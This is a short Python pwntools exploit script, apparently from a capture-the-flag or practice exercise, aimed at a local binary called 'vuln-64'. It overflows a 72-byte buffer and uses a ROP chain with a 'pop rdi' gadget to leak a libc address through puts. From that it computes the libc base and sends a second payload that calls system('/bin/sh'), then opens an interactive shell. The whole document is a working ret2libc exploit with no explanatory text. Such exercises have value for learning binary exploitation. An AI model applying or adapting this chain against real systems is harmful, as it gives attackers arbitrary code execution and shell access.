from pwn import *

binary = "./vuln-64"
elf = context.binary = ELF(binary)
libc = ELF("libc.so.6")

p = process(binary)


## Gadgets - Addresses 
#0x0000000000401016 : ret
#0x00000000004011cb : pop rdi ; ret
#00401132 : Vuln

vuln = p64(0x00401132)
ret = p64(0x0000000000401016)
rdi = p64(0x00000000004011cb)

## Functions
gets = p64(elf.sym["got.gets"])
puts = p64(elf.sym["plt.puts"])

payload = b"A"*72
payload += rdi
payload += gets
payload += puts
payload += vuln

p.recv()
p.sendline(payload)

## Leak

leak = u64(p.recvline()[:-1].strip().ljust(8,b"\x00"))

libc.address = leak - libc.symbols['gets']
bin_sh = p64(next(libc.search(b"/bin/sh\x00")))
system = p64(libc.symbols.system)

## All addresses
print("Leak : " + hex(leak))
print("Libc Base : " + hex(libc.address))
print("str_bin_sh : " + hex(u64(bin_sh.ljust(8,b"\x00"))))
print("system : " + hex(u64(system.ljust(8,b"\x00"))))


#pause() #Debugging purpose, use x/s [address] to check if the leak is correct

## Attack payload
payload = b"A"*72
payload += ret
payload += rdi
payload += bin_sh
payload += system

p.recv()
p.sendline(payload)
p.interactive()